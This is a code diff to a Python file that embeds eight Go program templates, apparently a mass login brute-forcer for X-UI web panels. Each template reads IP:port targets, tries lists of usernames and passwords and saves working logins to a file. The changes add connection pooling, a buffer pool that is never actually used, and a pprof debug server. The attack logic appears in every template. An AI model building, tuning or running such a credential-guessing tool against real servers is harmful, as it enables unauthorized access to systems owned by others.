@@ -20,7 +20,7 @@ try:
 except ImportError:
     pass
 
-# =========================== xui.go模板1内容 (增加强制GC) ===========================
+# =========================== xui.go模板1内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_1 = '''package main
 
 import (
@@ -28,8 +28,10 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
+	_ "net/http/pprof" // 引入pprof
 	"net/url"
 	"os"
 	"os/signal"
@@ -49,7 +51,18 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
+// 使用sync.Pool复用缓冲区，减少内存分配
+var bufferPool = sync.Pool{
+	New: func() interface{} {
+		b := make([]byte, 4*1024) // 4KB buffer
+		return &b
+	},
+}
+
 var httpClient = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100, // 增加每个主机的空闲连接数
+	},
 	Timeout: 10 * time.Second,
 }
 
@@ -136,18 +149,21 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				continue
 			}
 			
-			defer resp.Body.Close()
-
 			if resp.StatusCode == http.StatusOK {
-				body, _ := ioutil.ReadAll(resp.Body)
+				bufPtr := bufferPool.Get().(*[]byte)
+				body, _ := io.ReadAll(resp.Body)
+				bufferPool.Put(bufPtr)
+
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
 						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+						resp.Body.Close()
 						return
 					}
 				}
 			}
+			resp.Body.Close()
 		}
 	}
 }
@@ -209,6 +225,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -259,7 +279,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板2内容 (增加强制GC) ===========================
+# =========================== xui.go模板2内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_2 = '''package main
 
 import (
@@ -267,8 +287,10 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -288,7 +310,17 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
+var bufferPool = sync.Pool{
+	New: func() interface{} {
+		b := make([]byte, 4*1024)
+		return &b
+	},
+}
+
 var httpClient = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100,
+	},
 	Timeout: 10 * time.Second,
 }
 
@@ -378,18 +410,21 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				continue
 			}
 			
-			defer resp.Body.Close()
-
 			if resp.StatusCode == http.StatusOK {
-				body, _ := ioutil.ReadAll(resp.Body)
+				bufPtr := bufferPool.Get().(*[]byte)
+				body, _ := io.ReadAll(resp.Body)
+				bufferPool.Put(bufPtr)
+				
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
 						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+						resp.Body.Close()
 						return
 					}
 				}
 			}
+			resp.Body.Close()
 		}
 	}
 }
@@ -451,6 +486,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -501,7 +540,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板3内容 (增加强制GC) ===========================
+# =========================== xui.go模板3内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_3 = '''package main
 
 import (
@@ -509,8 +548,10 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -530,7 +571,17 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
+var bufferPool = sync.Pool{
+	New: func() interface{} {
+		b := make([]byte, 4*1024)
+		return &b
+	},
+}
+
 var httpClient = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100,
+	},
 	Timeout: 10 * time.Second,
 }
 
@@ -611,20 +662,23 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				continue
 			}
 			
-			defer resp.Body.Close()
-
 			if resp.StatusCode == http.StatusOK {
-				body, _ := ioutil.ReadAll(resp.Body)
+				bufPtr := bufferPool.Get().(*[]byte)
+				body, _ := io.ReadAll(resp.Body)
+				bufferPool.Put(bufPtr)
+
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if data, ok := responseData["data"].(map[string]interface{}); ok {
 						if token, exists := data["accessToken"].(string); exists && token != "" {
 							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+							resp.Body.Close()
 							return
 						}
 					}
 				}
 			}
+			resp.Body.Close()
 		}
 	}
 }
@@ -686,6 +740,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -736,7 +794,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板4内容 (增加强制GC) ===========================
+# =========================== xui.go模板4内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_4 = '''package main
 
 import (
@@ -744,8 +802,10 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -765,7 +825,17 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
+var bufferPool = sync.Pool{
+	New: func() interface{} {
+		b := make([]byte, 4*1024)
+		return &b
+	},
+}
+
 var httpClient = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100,
+	},
 	Timeout: 10 * time.Second,
 }
 
@@ -850,24 +920,25 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				continue
 			}
 			
-			defer resp.Body.Close()
-			
-			if resp.StatusCode != 200 {
-				continue
-			}
+			if resp.StatusCode == 200 {
+				bufPtr := bufferPool.Get().(*[]byte)
+				body, _ := io.ReadAll(resp.Body)
+				bufferPool.Put(bufPtr)
 
-			body, _ := ioutil.ReadAll(resp.Body)
-			var responseData map[string]interface{}
-			if err := json.Unmarshal(body, &responseData); err == nil {
-				if success, ok := responseData["success"].(bool); ok && success {
-					if data, ok := responseData["data"].(map[string]interface{}); ok {
-						if token, exists := data["token"]; exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-							return
+				var responseData map[string]interface{}
+				if err := json.Unmarshal(body, &responseData); err == nil {
+					if success, ok := responseData["success"].(bool); ok && success {
+						if data, ok := responseData["data"].(map[string]interface{}); ok {
+							if token, exists := data["token"]; exists && token != "" {
+								writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+								resp.Body.Close()
+								return
+							}
 						}
 					}
 				}
 			}
+			resp.Body.Close()
 		}
 	}
 }
@@ -929,6 +1000,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -979,7 +1054,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板5内容 (增加强制GC) ===========================
+# =========================== xui.go模板5内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_5 = '''package main
 
 import (
@@ -987,8 +1062,10 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -1008,7 +1085,17 @@ var totalTasks int64
 var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
+var bufferPool = sync.Pool{
+	New: func() interface{} {
+		b := make([]byte, 4*1024)
+		return &b
+	},
+}
+
 var httpClient = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100,
+	},
 	Timeout: 10 * time.Second,
 }
 
@@ -1091,20 +1178,21 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				continue
 			}
 
-			defer resp.Body.Close()
+			if resp.StatusCode == 200 {
+				bufPtr := bufferPool.Get().(*[]byte)
+				body, _ := io.ReadAll(resp.Body)
+				bufferPool.Put(bufPtr)
 
-			if resp.StatusCode != 200 {
-				continue
-			}
-
-			body, _ := ioutil.ReadAll(resp.Body)
-			var responseData map[string]interface{}
-			if err := json.Unmarshal(body, &responseData); err == nil {
-				if success, ok := responseData["success"].(bool); ok && success {
-					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-					return
+				var responseData map[string]interface{}
+				if err := json.Unmarshal(body, &responseData); err == nil {
+					if success, ok := responseData["success"].(bool); ok && success {
+						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
+						resp.Body.Close()
+						return
+					}
 				}
 			}
+			resp.Body.Close()
 		}
 	}
 }
@@ -1166,6 +1254,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -1222,6 +1314,8 @@ XUI_GO_TEMPLATE_6 = '''package main
 import (
 	"bufio"
 	"fmt"
+	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -1596,6 +1690,10 @@ func recordFailure(ip, port, username, password, reason string) {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -1659,7 +1757,7 @@ RETRY:
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板7内容 (增加强制GC) ===========================
+# =========================== xui.go模板7内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_7 = '''package main
 
 import (
@@ -1668,6 +1766,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -1863,6 +1962,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -1903,7 +2006,12 @@ func main() {
 	startTime = time.Now()
 	go updateProgress()
 
-	client := &http.Client{Timeout: timeoutSeconds * time.Second}
+	client := &http.Client{
+		Transport: &http.Transport{
+			MaxIdleConnsPerHost: 100,
+		},
+		Timeout: timeoutSeconds * time.Second,
+	}
 
 	for _, line := range lines {
 		wg.Add(1)
@@ -1915,7 +2023,7 @@ func main() {
 	fmt.Println("\\n全部处理完成！")
 }
 '''
-# =========================== xui.go模板8内容 (增加强制GC) ===========================
+# =========================== xui.go模板8内容 (增加sync.Pool和pprof) ===========================
 XUI_GO_TEMPLATE_8 = '''package main
 
 import (
@@ -1923,6 +2031,7 @@ import (
 	"context"
 	"fmt"
 	"net/http"
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -1943,6 +2052,9 @@ var startTime time.Time
 var shutdownRequest = make(chan struct{})
 
 var client = &http.Client{
+	Transport: &http.Transport{
+		MaxIdleConnsPerHost: 100,
+	},
     Timeout: 10 * time.Second,
     CheckRedirect: func(req *http.Request, via []*http.Request) error {
         return http.ErrUseLastResponse
@@ -2123,6 +2235,10 @@ func updateProgress() {
 }
 
 func main() {
+	go func() {
+		http.ListenAndServe("localhost:6060", nil)
+	}()
+
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
